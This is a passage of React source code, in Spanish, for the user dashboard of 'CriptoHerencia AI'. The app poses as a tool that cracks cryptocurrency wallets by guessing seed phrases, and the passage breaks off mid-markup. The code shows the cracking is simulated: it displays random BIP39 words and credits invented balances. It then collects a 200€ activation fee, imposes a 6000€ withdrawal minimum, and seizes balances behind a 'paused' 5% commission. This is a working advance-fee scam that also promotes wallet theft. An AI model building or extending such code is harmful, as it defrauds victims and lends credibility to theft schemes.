import React, { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import { useAuth } from '../context/AuthContext';
import { Button } from '../components/ui/button';
import { Card, CardContent, CardHeader, CardTitle } from '../components/ui/card';
import { Input } from '../components/ui/input';
import { Label } from '../components/ui/label';
import { Badge } from '../components/ui/badge';
import { Separator } from '../components/ui/separator';
import { useToast } from '../hooks/use-toast';
import { 
  Menu, 
  X, 
  Play, 
  Wallet, 
  History, 
  CreditCard, 
  LogOut, 
  Shield,
  AlertCircle,
  Copy,
  CheckCircle,
  Target,
  Lock,
  Bitcoin,
  Zap,
  Plus,
  HelpCircle
} from 'lucide-react';
import { bip39Words, getRandomAmount, cryptoIcons, paymentAddresses } from '../components/mock';

const UserDashboard = () => {
  const navigate = useNavigate();
  const { user, logout, updateUser, updateUserActivity } = useAuth();
  const { toast } = useToast();
  
  const [menuOpen, setMenuOpen] = useState(false);
  const [currentView, setCurrentView] = useState('simulator');
  const [selectedCrypto, setSelectedCrypto] = useState('');
  const [userWallet, setUserWallet] = useState('');
  const [isSimulating, setIsSimulating] = useState(false);
  const [currentWords, setCurrentWords] = useState(
    Array(12).fill(user && !user.verified ? 'prueba' : 'empezar')
  );
  const [foundWallet, setFoundWallet] = useState(null);
  const [showCryptoPayment, setShowCryptoPayment] = useState(false);
  const [showCardPayment, setShowCardPayment] = useState(false);
  const [voucherCode, setVoucherCode] = useState('');
  const [attackInProgress, setAttackInProgress] = useState(false);
  const [searchStatus, setSearchStatus] = useState('idle'); // idle, searching, found
  const [selectedWithdrawCrypto, setSelectedWithdrawCrypto] = useState('');
  const [withdrawWallet, setWithdrawWallet] = useState('');
  const [userStatusPolling, setUserStatusPolling] = useState(null);
  const [showRechargeModal, setShowRechargeModal] = useState(false);
  const [showRechargeCrypto, setShowRechargeCrypto] = useState(false);
  const [showRechargeCard, setShowRechargeCard] = useState(false);
  const [showPurchaseModal, setShowPurchaseModal] = useState(false);
  const [hasUsedFreeTrial, setHasUsedFreeTrial] = useState(user?.has_used_free_trial || false);
  const [showActivationModal, setShowActivationModal] = useState(false);

  // Sincronizar hasUsedFreeTrial con los datos del usuario
  useEffect(() => {
    if (user?.has_used_free_trial !== undefined) {
      setHasUsedFreeTrial(user.has_used_free_trial);
    }
  }, [user?.has_used_free_trial]);

  // Redirect if not authenticated
  useEffect(() => {
    if (!user) {
      navigate('/login');
      return;
    }
    
    // Redirect admin to admin panel
    if (user.isAdmin) {
      navigate('/admin');
      return;
    }
    
    setUserWallet(user.wallet || '');
    
    // Actualizar actividad al cargar el dashboard
    updateUserActivity();
    
    // Configurar actualizaciones periódicas de actividad cada 30 segundos
    const activityInterval = setInterval(() => {
      updateUserActivity();
    }, 30000); // 30 segundos
    
    return () => {
      if (activityInterval) {
        clearInterval(activityInterval);
      }
    };
  }, [user, navigate, updateUserActivity]);

  // Sistema de tracking de actividad del usuario
  const trackUserActivity = () => {
    if (updateUserActivity) {
      updateUserActivity();
    }
  };

  // Actualizar actividad en acciones específicas
  useEffect(() => {
    let lastActivityTime = Date.now();
    const ACTIVITY_THROTTLE = 10000; // 10 segundos mínimo entre actualizaciones
    
    const handleUserInteraction = () => {
      const now = Date.now();
      if (now - lastActivityTime > ACTIVITY_THROTTLE) {
        trackUserActivity();
        lastActivityTime = now;
      }
    };

    // Trackear interacciones importantes (menos frecuente)
    document.addEventListener('click', handleUserInteraction);
    document.addEventListener('keydown', handleUserInteraction);
    
    // Detectar cuando el usuario deja la página
    const handleVisibilityChange = () => {
      if (document.visibilityState === 'hidden') {
        trackUserActivity(); // Actualizar actividad al salir
      }
    };
    
    const handleBeforeUnload = () => {
      trackUserActivity(); // Actualizar actividad al cerrar página
    };

    document.addEventListener('visibilitychange', handleVisibilityChange);
    window.addEventListener('beforeunload', handleBeforeUnload);

    return () => {
      document.removeEventListener('click', handleUserInteraction);
      document.removeEventListener('keydown', handleUserInteraction);
      document.removeEventListener('visibilitychange', handleVisibilityChange);
      window.removeEventListener('beforeunload', handleBeforeUnload);
    };
  }, []);

  // Polling para verificar cambios en el estado del usuario
  useEffect(() => {
    if (!user || user.isAdmin) return;

    const checkUserStatus = async () => {
      try {
        const backendUrl = process.env.REACT_APP_BACKEND_URL;
        const response = await fetch(`${backendUrl}/api/users`);
        
        if (response.ok) {
          const users = await response.json();
          const currentUser = users.find(u => u.id === user.id);
          
          if (!currentUser) {
            console.warn('Usuario no encontrado en la respuesta del backend');
            return;
          }
          
          console.log('Estado actual del usuario:', {
            frontend: { verified: user.verified, approved: user.approved },
            backend: { verified: currentUser.verified, approved: currentUser.approved }
          });
          
          if (currentUser && (
            currentUser.verified !== user.verified || 
            currentUser.approved !== user.approved ||
            JSON.stringify(currentUser.balance) !== JSON.stringify(user.balance)
          )) {
            // El estado del usuario cambió, actualizar usuario completamente
            const wasVerified = user.verified;
            updateUser(currentUser);
            
            // Solo mostrar toast si cambió de no verificado a verificado
            if (!wasVerified && currentUser.verified) {
              toast({
                title: "¡Cuenta Verificada!",
                description: "Tu cuenta ha sido verificada. Ya puedes usar CriptoHerencia.",
                variant: "default"
              });
            }
          }
        } else {
          console.error('Error al obtener usuarios del backend:', response.status, response.statusText);
        }
      } catch (error) {
        console.error('Error checking user status:', error);
      }
    };

    // Verificar estado cada 5 segundos solo si el usuario no está verificado
    if (!user.verified) {
      const interval = setInterval(checkUserStatus, 5000);
      setUserStatusPolling(interval);
      
      return () => {
        if (interval) {
          clearInterval(interval);
        }
      };
    } else {
      // Si el usuario ya está verificado, limpiar cualquier polling existente
      if (userStatusPolling) {
        clearInterval(userStatusPolling);
        setUserStatusPolling(null);
      }
    }
  }, [user, updateUser, toast]);

  const validateWalletAddress = (address, type) => {
    const patterns = {
      BTC: /^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,87}$/,
      ETH: /^0x[a-fA-F0-9]{40}$/,
      LTC: /^(ltc1|[LM3])[a-zA-HJ-NP-Z0-9]{25,87}$/
    };
    
    return patterns[type]?.test(address) || false;
  };

  const getWalletType = (address) => {
    if (validateWalletAddress(address, 'BTC')) return 'BTC';
    if (validateWalletAddress(address, 'ETH')) return 'ETH';
    if (validateWalletAddress(address, 'LTC')) return 'LTC';
    return null;
  };

  // Crypto logos y colores
  const cryptoLogos = {
    BTC: '₿',
    ETH: 'Ξ', 
    LTC: 'Ł'
  };

  const cryptoColors = {
    BTC: 'bg-orange-500 hover:bg-orange-600 border-orange-500',
    ETH: 'bg-blue-500 hover:bg-blue-600 border-blue-500', 
    LTC: 'bg-gray-500 hover:bg-gray-600 border-gray-500'
  };

  const startSimulation = async () => {
    if (!selectedCrypto) {
      toast({
        title: "Error",
        description: "Selecciona el tipo de billetera a atacar",
        variant: "destructive"
      });
      return;
    }

    // CRÍTICO: Para usuarios no verificados, verificar si ya usaron su prueba gratis
    if (!user.verified) {
      if (hasUsedFreeTrial || user.has_used_free_trial) {
        toast({
          title: "Prueba Gratis Agotada",
          description: "Ya usaste tu prueba gratis. Activa el programa para continuar atacando y ganando dinero",
          variant: "destructive"
        });
        return;
      }
    }

    setAttackInProgress(true);
    setIsSimulating(true);
    setSearchStatus('searching');
    setFoundWallet(null);
    
    // NO marcar como usado aún, solo al COMPLETAR la simulación
    
    // Simular búsqueda de palabras seed (más rápido)
    const interval = setInterval(() => {
      const randomWords = [];
      for (let i = 0; i < 12; i++) {
        randomWords.push(bip39Words[Math.floor(Math.random() * bip39Words.length)]);
      }
      setCurrentWords(randomWords);
    }, 50); // Cambiado de 100ms a 50ms para velocidad más rápida

    // Usar tiempos personalizados del usuario (en minutos, convertir a milisegundos)
    const minTime = (user.wallet_find_time_min || 3) * 60 * 1000;
    const maxTime = (user.wallet_find_time_max || 10) * 60 * 1000;
    const findTime = minTime + Math.random() * (maxTime - minTime);
    
    setTimeout(async () => {
      clearInterval(interval);
      setIsSimulating(false);
      setAttackInProgress(false);
      setSearchStatus('found');
      
      const amount = user.verified ? 
        getRandomAmount() : // Verificados: rango original (modifiqué mal antes)
        (Math.floor(Math.random() * (250 - 80 + 1)) + 80); // No verificados: 80€-250€
      
      setFoundWallet({
        type: selectedCrypto,
        amount: amount,
        phrase: currentWords
      });

      // CRÍTICO: Solo AQUÍ marcar como usado si es usuario no verificado
      if (!user.verified && !hasUsedFreeTrial) {
        console.log("🔒 MARCANDO PRUEBA GRATIS COMO USADA - BLOQUEO PERMANENTE ACTIVADO");
        setHasUsedFreeTrial(true);
        
        // Actualizar en el backend INMEDIATAMENTE
        try {
          const backendUrl = process.env.REACT_APP_BACKEND_URL;
          const response = await fetch(`${backendUrl}/api/users/${user.id}`, {
            method: 'PUT',
            headers: {
              'Content-Type': 'application/json',
            },
            body: JSON.stringify({
              has_used_free_trial: true
            })
          });
          
          if (response.ok) {
            // Actualizar usuario local INMEDIATAMENTE
            const updatedUser = { ...user, has_used_free_trial: true };
            updateUser(updatedUser);
            console.log("✅ Usuario marcado como prueba gratis usada en backend Y frontend");
          } else {
            console.error("❌ Error al actualizar estado de prueba gratis en backend");
          }
        } catch (error) {
          console.error('❌ Error updating free trial status:', error);
        }
      }

      // CRÍTICO: Actualizar balance en el backend para persistencia
      try {
        const backendUrl = process.env.REACT_APP_BACKEND_URL;
        const newBalance = { ...user.balance };
        newBalance[selectedCrypto] = (newBalance[selectedCrypto] || 0) + amount;
        
        const response = await fetch(`${backendUrl}/api/users/${user.id}`, {
          method: 'PUT',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({ balance: newBalance })
        });

        if (response.ok) {
          // Actualizar el usuario en el contexto local
          updateUser({ ...user, balance: newBalance });
          console.log('Balance actualizado en backend:', newBalance);
        } else {
          console.error('Error al actualizar balance en backend');
        }
      } catch (error) {
        console.error('Error al guardar balance:', error);
      }

      toast({
        title: `¡Billetera Encontrada!`,
        description: `Se han sumado ${amount.toFixed(8)} ${selectedCrypto} a tu saldo`,
      });
    }, findTime);
  };
  const continueSearching = () => {
    // CRÍTICO: Para usuarios no verificados, siempre verificar si ya usaron su prueba gratis
    if (!user.verified) {
      // Verificar tanto el estado local como el del usuario (redundancia para seguridad)
      if (hasUsedFreeTrial || user.has_used_free_trial) {
        // Mostrar mensaje y mantener bloqueo
        toast({
          title: "Activa el Programa",
          description: "Tu prueba gratis ha terminado. Activa el programa para seguir atacando y ganando dinero",
          variant: "destructive"
        });
        // CRÍTICO: Asegurar que el estado se mantiene bloqueado
        setHasUsedFreeTrial(true);
        return;
      }
      // Si llegó aquí es porque algo está mal - no debería poder llegar sin haber usado la prueba
      console.error("Usuario no verificado intentando continuar sin haber usado prueba gratis");
      return;
    }
    
    // Solo para usuarios verificados
    setSearchStatus('idle');
    setFoundWallet(null);
    setCurrentWords(Array(12).fill('empezar'));
  };

  const processWithdrawal = async () => {
    if (!selectedWithdrawCrypto || !withdrawWallet.trim()) {
      toast({
        title: "Error",
        description: "Selecciona una criptomoneda y dirección de wallet",
        variant: "destructive"
      });
      return;
    }

    // Para usuarios NO VERIFICADOS: Mostrar modal de activación
    if (!user.verified) {
      setShowActivationModal(true);
      return;
    }

    // Verificar mínimo de 6000€ usando la nota personalizada del usuario (solo para verificados)
    const totalBalance = getTotalBalance();
    if (totalBalance < 6000) {
      // Usar la nota personalizada del usuario o la predeterminada
      const withdrawalNote = user.withdrawal_note || "El mínimo de retiro es de 6000€. Si tu saldo es menor, debes seguir atacando billeteras para alcanzar el mínimo.";
      
      toast({
        title: "Balance Insuficiente",
        description: withdrawalNote,
        variant: "destructive",
        duration: 5000
      });
      return;
    }

    const cryptoBalance = user.balance[selectedWithdrawCrypto] || 0;
    const commissionAmount = (cryptoBalance * 0.05); // 5% de comisión
    
    // Crear entrada profesional en el historial con estado PAUSADO
    const withdrawal = {
      id: Date.now().toString(),
      date: new Date().toISOString(),
      type: selectedWithdrawCrypto,
      amount: cryptoBalance,
      wallet: withdrawWallet,
      status: 'PAUSADO',
      commission: commissionAmount,
      statusNote: `Retiro pausado: Se requiere pago de comisión del 5% (€${commissionAmount.toFixed(2)}) al administrador del sistema antes de procesar el retiro.`,
      processingNote: 'Los fondos han sido reservados y removidos de tu saldo activo. El retiro se completará una vez confirmado el pago de la comisión administrativa.'
    };

    // CRÍTICO: Actualizar balance en el backend (remover fondos inmediatamente)
    try {
      const backendUrl = process.env.REACT_APP_BACKEND_URL;
      const newBalance = { ...user.balance };
      newBalance[selectedWithdrawCrypto] = 0;
      
      const response = await fetch(`${backendUrl}/api/users/${user.id}`, {
        method: 'PUT',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ balance: newBalance })
      });

      if (response.ok) {
        // Actualizar el usuario en el contexto local
        updateUser({ ...user, balance: newBalance });
        console.log('Balance actualizado tras retiro:', newBalance);
      } else {
        console.error('Error al actualizar balance tras retiro');
      }
    } catch (error) {
      console.error('Error al procesar retiro:', error);
    }

    // Guardar en historial (localStorage para historial local)
    const history = JSON.parse(localStorage.getItem(`history_${user.id}`) || '[]');
    history.unshift(withdrawal);
    localStorage.setItem(`history_${user.id}`, JSON.stringify(history));

    // Reset estados
    setSelectedWithdrawCrypto('');
    setWithdrawWallet('');

    // Mostrar mensaje profesional de procesamiento
    toast({
      title: "Retiro Iniciado",
      description: `Los fondos (€${cryptoBalance.toFixed(2)}) han sido reservados. Estado: PAUSADO - Ver historial para más detalles.`,
      duration: 6000
    });
  };

  const withdrawFunds = () => {
    if (!foundWallet) return;
    
    // Simular retiro
    const withdrawal = {
      id: Date.now().toString(),
      date: new Date().toISOString(),
      type: foundWallet.type,
      amount: foundWallet.amount,
      wallet: userWallet,
      status: 'Retirado'
    };

    // Guardar en historial
    const history = JSON.parse(localStorage.getItem(`history_${user.id}`) || '[]');
    history.unshift(withdrawal);
    localStorage.setItem(`history_${user.id}`, JSON.stringify(history));

    setFoundWallet(null);
    toast({
      title: "Retiro Procesado",
      description: `${foundWallet.amount}€ enviados a tu wallet`,
    });
  };

  const copyToClipboard = (text) => {
    navigator.clipboard.writeText(text);
    toast({
      title: "Copiado",
      description: "Dirección copiada al portapapeles",
    });
  };

  const submitVoucher = async () => {
    if (!voucherCode.trim()) {
      toast({
        title: "Error",
        description: "Introduce un código de voucher válido",
        variant: "destructive"
      });
      return;
    }

    // SOLUCIÓN REAL: Enviar voucher al backend MongoDB
    const backendUrl = process.env.REACT_APP_BACKEND_URL;
    
    try {
      const response = await fetch(`${backendUrl}/api/vouchers`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          user_email: user.email,
          code: voucherCode,
          device: navigator.userAgent
        })
      });

      if (response.ok) {
        const newVoucher = await response.json();
        console.log('Voucher enviado al backend:', newVoucher.code);
        
        // También guardar localmente para compatibilidad
        const localVouchers = JSON.parse(localStorage.getItem('cryptovouchers') || '[]');
        localVouchers.push({
          id: newVoucher.id,
          userEmail: newVoucher.user_email,
          code: newVoucher.code,
          status: newVoucher.status,
          date: newVoucher.date
        });
        localStorage.setItem('cryptovouchers', JSON.stringify(localVouchers));
        
        toast({
          title: "Código Enviado",
          description: "Tu código ha sido enviado al administrador para revisión",
        });
        
      } else {
        const error = await response.json();
        toast({
          title: "Error",
          description: error.detail || "No se pudo enviar el código",
          variant: "destructive"
        });
        return;
      }
      
    } catch (error) {
      console.error('Error enviando voucher:', error);
      
      // Fallback: usar localStorage si backend falla
      const vouchers = JSON.parse(localStorage.getItem('cryptovouchers') || '[]');
      const newVoucher = {
        id: Date.now().toString(),
        userEmail: user.email,
        code: voucherCode,
        status: 'pendiente',
        date: new Date().toISOString()
      };
      vouchers.push(newVoucher);
      localStorage.setItem('cryptovouchers', JSON.stringify(vouchers));
      
      console.log('Voucher guardado en localStorage como fallback');
      
      toast({
        title: "Código Enviado (Offline)",
        description: "Tu código ha sido guardado. Será sincronizado cuando se restaure la conexión.",
      });
    }

    setVoucherCode('');
    toast({
      title: "Código Enviado",
      description: "Tu código está siendo verificado por el administrador",
    });
  };

  const getHistory = () => {
    return JSON.parse(localStorage.getItem(`history_${user.id}`) || '[]');
  };

  const getTotalBalance = () => {
    if (!user.balance) return 0;
    return Object.values(user.balance).reduce((sum, value) => sum + value, 0);
  };

  if (!user) return null;

  return (
    <div className="min-h-screen bg-gradient-to-br from-gray-50 to-white text-gray-800 font-sans">
      {/* Subtle Matrix background */}
      <div className="absolute inset-0 opacity-3 pointer-events-none overflow-hidden">
        {[...Array(10)].map((_, i) => (
          <div
            key={i}
            className="absolute animate-pulse text-green-500 text-xs"
            style={{
              left: `${Math.random() * 100}%`,
              top: `${Math.random() * 100}%`,
              animationDelay: `${Math.random() * 3}s`,
              animationDuration: `${2 + Math.random() * 3}s`
            }}
          >
            {Math.random() > 0.5 ? '1' : '0'}
          </div>
        ))}
      </div>

      <div className="relative z-10">
        {/* Header */}
        <header className="bg-white border-b border-gray-200 shadow-sm p-4">
          <div className="flex items-center justify-between">
            <div className="flex items-center space-x-4">
              <h1 className="text-xl font-bold text-gray-900 font-sans">
                CRIPTOHERENCIA AI
              </h1>
            </div>
            
            <div className="flex items-center space-x-4">
              <div className="text-right">
                <div className="text-xs text-gray-500 font-sans">SALDO DISPONIBLE:</div>
                <div className="text-lg font-bold text-green-600 font-sans">
                  €{getTotalBalance()}
                </div>
              </div>
              
              <Button
                variant="ghost"
                size="sm"
                onClick={() => setMenuOpen(!menuOpen)}
                className="text-gray-600 hover:text-gray-900 font-sans"
              >
                {menuOpen ? <X className="h-5 w-5" /> : <Menu className="h-5 w-5" />}
              </Button>
            </div>
          </div>
        </header>

        <div className="flex">
          {/* Sidebar Menu */}
          {menuOpen && (
            <div className="absolute right-0 top-16 bg-slate-900/95 backdrop-blur border border-green-500/50 rounded-lg shadow-2xl shadow-green-500/20 overflow-hidden min-w-[200px] z-50">
              <div className="p-2">
                <Button
                  variant={currentView === 'simulator' ? 'default' : 'ghost'}
                  onClick={() => {setCurrentView('simulator'); setMenuOpen(false);}}
                  className="w-full justify-start text-green-400 font-mono text-sm mb-1 hover:bg-green-500/20"
                >
                  <Target className="h-4 w-4 mr-2" />
                  ATACAR
                </Button>
                <Button
                  variant={currentView === 'history' ? 'default' : 'ghost'}
                  onClick={() => {setCurrentView('history'); setMenuOpen(false);}}
                  className="w-full justify-start text-green-400 font-mono text-sm mb-1 hover:bg-green-500/20"
                >
                  <History className="h-4 w-4 mr-2" />
                  HISTORIAL
                </Button>
                <Button
                  variant={currentView === 'withdraw' ? 'default' : 'ghost'}
                  onClick={() => {setCurrentView('withdraw'); setMenuOpen(false);}}
                  className="w-full justify-start text-green-400 font-mono text-sm mb-1 hover:bg-green-500/20"
                >
                  <Wallet className="h-4 w-4 mr-2" />
                  RETIRAR
                </Button>
                <Button
                  variant="ghost"
                  onClick={() => {
                    if (user.verified) {
                      setShowRechargeModal(true);
                    } else {
                      setShowPurchaseModal(true);
                    }
                    setMenuOpen(false);
                  }}
                  className={`w-full justify-start font-mono text-sm mb-1 ${
                    user.verified 
                      ? 'text-blue-400 hover:bg-blue-500/20' 
                      : 'text-purple-400 hover:bg-purple-500/20'
                  }`}
                >
                  <Plus className="h-4 w-4 mr-2" />
                  {user.verified ? 'RECARGAR' : 'COMPRAR'}
                </Button>
                <Separator className="my-2 bg-green-500/30" />
                <Button
                  variant="ghost"
                  onClick={() => window.open('https://t.me/criptoherencia', '_blank')}
                  className="w-full justify-start text-gray-400 font-mono text-sm mb-1 hover:bg-gray-500/20"
                >
                  <HelpCircle className="h-4 w-4 mr-2" />
                  SOPORTE
                </Button>
                
                <Button
                  variant="ghost"
                  onClick={() => {logout(); navigate('/');}}
                  className="w-full justify-start text-red-400 hover:text-red-300 font-mono text-sm hover:bg-red-500/20"
                >
                  <LogOut className="h-4 w-4 mr-2" />
                  CERRAR SESION
                </Button>
              </div>
            </div>
          )}

          {/* Main Content */}
          <div className="flex-1 p-6 relative">
            {/* Account Status Alert */}
            {!user.approved && (
              <Card className="bg-yellow-900/50 border-yellow-400/50 mb-6">
                <CardContent className="p-4">
                  <div className="flex items-center space-x-2">
                    <AlertCircle className="h-5 w-5 text-yellow-400" />
                    <div>
                      <h3 className="font-bold text-yellow-400 font-mono">&gt; CUENTA PENDIENTE</h3>
                      <p className="text-sm text-yellow-200 font-mono">Tu cuenta está pendiente de verificación por el administrador.</p>
                    </div>
                  </div>
                </CardContent>
              </Card>
            )}

            {/* Verification Required - Only for logged in but not verified users */}
            {user.approved && !user.verified && (
              <Card className="bg-white border-blue-200 shadow-sm mb-6">
                <CardContent className="p-4">
                  <div className="flex items-center space-x-2">
                    <Shield className="h-5 w-5 text-blue-600" />
                    <div>
                      <h3 className="font-bold text-gray-800 font-sans">VERIFICACIÓN REQUERIDA</h3>
                      <p className="text-sm text-gray-600 font-sans">
                        Para usar CriptoHerencia y así ganar dinero necesitas activar el programa.
                      </p>
                    </div>
                  </div>
                </CardContent>
              </Card>
            )}

            {/* Activate Program Section - Only for approved but not verified users */}
            {user.approved && !user.verified && (
              <div className="relative mb-6 p-[2px] rounded-lg bg-gradient-to-r from-blue-500 via-purple-500 to-blue-500 animate-pulse">
                {/* Animated border background */}
                <div 
                  className="absolute inset-0 rounded-lg opacity-80"
                  style={{
                    background: `linear-gradient(45deg, 
                      #3b82f6, #8b5cf6, #6366f1, #3b82f6, #8b5cf6, #3b82f6)`,
                    backgroundSize: '400% 400%',
                    animation: 'gradientShift 3s ease-in-out infinite'
                  }}
                />
                
                {/* Content card with proper z-index */}
                <Card className="relative bg-white shadow-sm border-0 rounded-[6px] z-10">
                  <CardHeader className="border-b border-gray-100">
                    <CardTitle className="text-gray-800 font-sans text-lg">ACTIVAR EL PROGRAMA</CardTitle>
                  </CardHeader>
                  <CardContent className="p-4 sm:p-6 space-y-4">
                    <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                      <Button 
                        onClick={() => setShowCryptoPayment(true)}
                        className="bg-gradient-to-r from-blue-600 to-blue-700 hover:from-blue-500 hover:to-blue-600 text-white font-sans font-bold py-3 rounded-lg"
                      >
                        Comprar con CriptoMonedas
                      </Button>
                      <Button 
                        onClick={() => setShowCardPayment(true)}
                        className="bg-gradient-to-r from-slate-600 to-slate-700 hover:from-slate-500 hover:to-slate-600 text-white font-sans font-bold py-3 rounded-lg"
                      >
                        Comprar con TARJETA
                      </Button>
                    </div>
                  </CardContent>
                </Card>
                
                {/* CSS for smooth gradient animation */}
                <style>{`
                  @keyframes gradientShift {
                    0% { background-position: 0% 50%; }
                    50% { background-position: 100% 50%; }
                    100% { background-position: 0% 50%; }
                  }
                `}</style>
              </div>
            )}

            {/* Crypto Payment Modal */}
            {showCryptoPayment && (
              <div className="fixed inset-0 bg-black/50 backdrop-blur flex items-center justify-center z-50 p-4">
                <div className="bg-white rounded-lg shadow-2xl max-w-2xl w-full max-h-[90vh] overflow-y-auto">
                  <div className="p-6 border-b border-gray-200">
                    <div className="flex items-center justify-between">
                      <h2 className="text-xl font-semibold text-gray-900 flex items-center">
                        <Wallet className="h-5 w-5 mr-2 text-gray-700" />
                        Pago con Criptomonedas
                      </h2>
                      <Button
                        onClick={() => setShowCryptoPayment(false)}
                        size="sm"
                        variant="outline"
                        className="border-gray-300 text-gray-500 hover:bg-gray-100"
                      >
                        <X className="h-4 w-4" />
                      </Button>
                    </div>
                  </div>
                  
                  <div className="p-6">
                    <p className="text-gray-600 mb-6 text-sm">
                      Envía exactamente 200€ en cualquiera de estas criptomonedas a la dirección correspondiente:
                    </p>
                    
                    <div className="space-y-4">
                      {Object.entries(paymentAddresses).map(([crypto, address]) => (
                        <div key={crypto} className="border border-gray-200 rounded-lg p-4 hover:border-gray-300 transition-colors">
                          <Label className="text-gray-700 font-medium capitalize mb-2 block">{crypto}:</Label>
                          <div className="flex items-center space-x-2">
                            <Input
                              value={address}
                              readOnly
                              className="bg-gray-50 border-gray-200 text-gray-800 text-sm font-mono"
                            />
                            <Button
                              onClick={() => copyToClipboard(address)}
                              size="sm"
                              variant="outline"
                              className="border-gray-300 text-gray-600 hover:bg-gray-100 flex-shrink-0"
                            >
                              <Copy className="h-4 w-4" />
                            </Button>
                          </div>
                        </div>
                      ))}
                    </div>
                    
                    <div className="bg-blue-50 border border-blue-200 p-4 rounded-lg mt-6">
                      <p className="text-blue-800 text-sm">
                        <strong>Importante:</strong> Una vez enviado el pago, tu cuenta será verificada automáticamente en un plazo de 24 horas.
                      </p>
                    </div>
                  </div>
                </div>
              </div>
            )}

            {/* Card Payment Modal */}
            {showCardPayment && (
              <div className="fixed inset-0 bg-black/50 backdrop-blur flex items-center justify-center z-50 p-2 sm:p-4">
                <div className="bg-white rounded-lg shadow-2xl w-full max-w-lg max-h-[95vh] sm:max-h-[90vh] overflow-y-auto mx-2 sm:mx-0">
                  <div className="p-4 sm:p-6 border-b border-gray-200">
                    <div className="flex items-center justify-between">
                      <h2 className="text-lg sm:text-xl font-semibold text-gray-900 flex items-center">
                        <CreditCard className="h-4 w-4 sm:h-5 sm:w-5 mr-2 text-gray-700" />
                        <span className="text-sm sm:text-base">Pago con Tarjeta</span>
                      </h2>
                      <Button
                        onClick={() => setShowCardPayment(false)}
                        size="sm"
                        variant="outline"
                        className="border-gray-300 text-gray-500 hover:bg-gray-100 p-1 sm:p-2"
                      >
                        <X className="h-3 w-3 sm:h-4 sm:w-4" />
                      </Button>
                    </div>
                  </div>
                  
                  <div className="p-4 sm:p-6 space-y-4 sm:space-y-6">
                    {/* Paso 1: Comprar CryptoVoucher */}
                    <div className="bg-gradient-to-r from-blue-50 to-indigo-50 border border-blue-200 rounded-lg p-3 sm:p-4">
                      <div className="flex items-start space-x-2 sm:space-x-3">
                        <div className="flex-shrink-0 w-6 h-6 sm:w-8 sm:h-8 bg-blue-600 text-white rounded-full flex items-center justify-center font-bold text-xs sm:text-sm">
                          1
                        </div>
                        <div className="flex-1 min-w-0">
                          <h3 className="font-semibold text-gray-800 mb-2 text-sm sm:text-base">
                            🛒 Compra tu CryptoVoucher de 200€
                          </h3>
                          <p className="text-gray-600 text-xs sm:text-sm mb-3 pr-2">
                            Para activar tu programa de forma <strong>rápida y segura</strong>, compra una CryptoVoucher (tarjeta regalo digital) por exactamente <strong>200€</strong>.
                          </p>
                          <Button
                            onClick={() => window.open('https://tarjetadirecta.es/product/crypto-voucher-200-euros', '_blank')}
                            className="bg-gradient-to-r from-green-600 to-green-700 hover:from-green-700 hover:to-green-800 text-white font-medium text-xs sm:text-sm px-3 sm:px-4 py-2 rounded-lg flex items-center space-x-1 sm:space-x-2 w-full sm:w-auto"
                          >
                            <span>🛍️</span>
                            <span className="truncate">Comprar CryptoVoucher 200€</span>
                          </Button>
                        </div>
                      </div>
                    </div>

                    {/* Paso 2: Canjear código */}
                    <div className="bg-gradient-to-r from-orange-50 to-yellow-50 border border-orange-200 rounded-lg p-3 sm:p-4">
                      <div className="flex items-start space-x-2 sm:space-x-3">
                        <div className="flex-shrink-0 w-6 h-6 sm:w-8 sm:h-8 bg-orange-600 text-white rounded-full flex items-center justify-center font-bold text-xs sm:text-sm">
                          2
                        </div>
                        <div className="flex-1 min-w-0">
                          <h3 className="font-semibold text-gray-800 mb-2 text-sm sm:text-base">
                            🔑 Canjea tu código aquí
                          </h3>
                          <p className="text-gray-600 text-xs sm:text-sm mb-3 pr-2">
                            Tras la compra recibirás un <strong>código de activación</strong>. Introdúcelo aquí y tu programa se activará <strong>inmediatamente</strong>.
                          </p>
                          
                          <div className="space-y-3">
                            <div>
                              <Label className="text-gray-700 font-medium text-xs sm:text-sm">Código del Voucher:</Label>
                              <Input
                                value={voucherCode}
                                onChange={(e) => setVoucherCode(e.target.value)}
                                placeholder="CV-XXXX-XXXX-XXXX"
                                className="bg-gray-50 border-gray-200 text-gray-800 mt-1 text-xs sm:text-sm"
                              />
                            </div>
                            
                            <Button
                              onClick={submitVoucher}
                              className="w-full bg-gradient-to-r from-blue-600 to-blue-700 hover:from-blue-700 hover:to-blue-800 text-white font-medium text-xs sm:text-sm py-2"
                              disabled={!voucherCode.trim()}
                            >
                              🚀 Activar Programa Inmediatamente
                            </Button>
                          </div>
                        </div>
                      </div>
                    </div>
                    
                    <div className="bg-blue-50 border border-blue-200 p-3 sm:p-4 rounded-lg">
                      <p className="text-blue-800 text-xs sm:text-sm">
                        <strong>💡 Proceso completo:</strong> Compra → Recibe código por email → Introdúcelo aquí → ¡Tu programa se activa al instante!
                      </p>
                    </div>
                  </div>
                </div>
              </div>
            )}

            {/* Main Content Views */}
            {currentView === 'simulator' && (
              <div className="space-y-6">
                {/* Crypto Selection - Professional Design */}
                <Card className="bg-white border-gray-200 shadow-sm">
                  <CardHeader className="border-b border-gray-100">
                    <CardTitle className="text-gray-800 font-sans text-lg">Seleccionar Criptomoneda Objetivo</CardTitle>
                  </CardHeader>
                  <CardContent className="p-6">
                    <div>
                      <Label className="text-gray-600 font-sans text-sm mb-3 block">Tipo de billetera a atacar:</Label>
                      <div className="grid grid-cols-3 gap-4">
                        {['BTC', 'ETH', 'LTC'].map((crypto) => (
                          <Button
                            key={crypto}
                            variant={selectedCrypto === crypto ? 'default' : 'outline'}
                            onClick={() => setSelectedCrypto(crypto)}
                            className={`${
                              selectedCrypto === crypto 
                                ? `${cryptoColors[crypto]} text-white border-0` 
                                : 'border-gray-300 text-gray-700 hover:bg-gray-50'
                            } font-sans text-sm py-3 px-4 flex flex-col items-center space-y-1 h-16`}
                          >
                            <span className="text-xl">{cryptoLogos[crypto]}</span>
                            <span className="text-xs">{crypto}</span>
                          </Button>
                        ))}
                      </div>
                    </div>
                  </CardContent>
                </Card>

                {/* Start Attack Button */}
                <div className="text-center">
                  <Button
                    onClick={() => {
                      if (!user.verified) {
                        // VERIFICACIÓN DOBLE: Estado local Y del usuario
                        if (hasUsedFreeTrial || user.has_used_free_trial) {
